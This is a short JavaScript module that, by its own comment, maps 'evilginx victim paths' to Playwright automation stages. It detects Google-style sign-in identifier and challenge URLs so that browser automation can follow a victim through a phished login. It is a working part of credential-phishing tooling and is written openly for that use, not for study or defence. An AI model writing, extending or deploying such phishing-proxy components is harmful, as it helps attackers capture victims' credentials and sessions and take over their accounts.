/** Map evilginx victim paths to Playwright flow stages (mirrors evilginx puppet_bridge.go). */

export function pathStage(path = '') {
  const p = String(path).split('?')[0];
  if (/^\/v3\/signin\/identifier/i.test(p) || /^\/signin\/v2\/identifier/i.test(p)) return 1;
  if (/^\/v3\/signin\/challenge/i.test(p) || /^\/signin\/v2\/challenge/i.test(p)) return 2;
  return 0;
}

export function isSigninHtmlPath(path = '') {
  return pathStage(path) > 0;
}
